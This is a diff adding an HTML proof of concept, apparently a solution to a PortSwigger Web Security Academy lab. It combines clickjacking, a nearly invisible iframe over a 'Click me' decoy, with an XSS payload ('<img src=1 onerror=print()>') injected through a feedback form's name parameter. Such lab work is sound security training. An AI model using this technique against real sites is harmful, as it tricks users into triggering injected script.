@@ -1,0 +1,18 @@
+<style>
+	iframe {
+		position:relative;
+		width:700px;
+		height: 500px;
+		opacity: 0.1;
+		z-index: 2;
+	}
+	div {
+		position:absolute;
+		top:410px;
+		left:80px;
+		z-index: 1;
+	}
+</style>
+<div>Click me</div>
+<iframe
+src="https://0adb007d04f1cceec0cf57e500cd0079.web-security-academy.net/feedback/?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
